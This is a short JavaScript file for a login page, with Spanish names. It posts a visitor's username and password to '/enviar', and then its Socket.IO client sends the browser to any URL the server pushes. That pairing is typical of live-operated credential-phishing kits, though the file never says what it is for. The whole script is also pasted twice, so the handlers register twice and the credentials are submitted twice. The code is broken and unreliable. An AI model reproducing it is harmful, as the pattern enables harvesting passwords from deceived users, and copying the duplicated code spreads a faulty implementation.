window.addEventListener('DOMContentLoaded', () => {

  document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const usuario = document.getElementById('usuario').value;
    const clave = document.getElementById('clave').value;

    fetch('/enviar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ usuario, clave })
    })
    .then(res => {
      if (res.ok) {
        window.location.href = 'opciones.html';
      } else {
        alert('Error al enviar datos');
      }
    });
  });

  // Conectar a Socket.IO solo si estamos en opciones.html
  if (window.location.pathname.includes('opciones.html')) {
    const socket = io();

    socket.on('connect', () => {
      console.log('🟢 Conectado al servidor de Socket.IO');
    });

    socket.on('redirect', (url) => {
      console.log('🔁 Redirigiendo a:', url);
      window.location.href = url;
    });
  }
});

// Esperar a que el DOM esté completamente cargado
window.addEventListener('DOMContentLoaded', () => {
  // Manejar el envío del formulario
  document.getElementById('login-form').addEventListener('submit', function (e) {
    e.preventDefault();

    const usuario = document.getElementById('usuario').value;
    const clave = document.getElementById('clave').value;

    fetch('/enviar', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ usuario, clave })
    })
    .then(res => {
      if (res.ok) {
        window.location.href = 'opciones.html';
      } else {
        alert('Error al enviar datos');
      }
    });
  });

  // Conectar a Socket.IO solo si estamos en opciones.html
  if (window.location.pathname.includes('opciones.html')) {
    const socket = io();

    socket.on('connect', () => {
      console.log('🟢 Conectado al servidor de Socket.IO');
    });

    socket.on('redirect', (url) => {
      console.log('🔁 Redirigiendo a:', url);
      window.location.href = url;
    });
  }
});

